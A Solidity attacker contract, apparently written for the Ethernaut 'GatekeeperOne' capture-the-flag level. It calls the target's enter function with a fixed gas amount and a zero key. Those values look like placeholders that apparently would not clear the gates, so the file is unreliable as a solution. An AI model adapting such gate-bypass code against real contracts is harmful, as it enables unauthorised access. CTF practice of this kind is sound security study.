// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneHacker {
    GatekeeperOne gatekeeper;
    constructor(address _gatekeeper) {
        gatekeeper = GatekeeperOne(_gatekeeper);
    }

    function callGatekeeper() public {
        bytes8 gateKey = 0x0000000000000000;
        (bool success, bytes memory returndata) = address(gatekeeper).call{gas: 8191}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (!success) {
            if (returndata.length > 0) {
                // Bubble up the original revert reason
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert("External call failed without reason");
            }
        }
    }

    
}